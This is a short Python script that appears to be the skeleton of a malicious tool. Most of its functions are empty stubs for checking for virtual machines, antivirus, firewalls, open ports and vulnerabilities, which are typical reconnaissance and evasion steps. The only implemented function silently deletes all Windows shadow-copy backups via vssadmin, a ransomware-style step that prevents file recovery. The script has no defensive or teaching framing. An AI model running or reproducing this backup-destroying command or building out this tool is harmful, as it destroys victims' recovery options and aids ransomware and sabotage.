import os

def get_os():
    return os.name

def list_process():
    if(get_os() == 'nt'):
        pass
    elif(get_os() == 'posix'):
        pass
    else:
        pass


def check_running_process(process_name):
    pass

def check_is_VM():
    pass

def check_firewall():
    pass

def check_av():
    pass

def check_open_ports():
    pass

def check_vulns():
    pass


def delete_shadow_copies():
    os.system('vssadmin.exe delete shadows /all /quiet')



def menu():
    if(get_os() == 'nt'):
        pass
    
    elif(get_os() == "posix"):
        pass
    else:
        pass


if __name__ == "__main__":
    menu()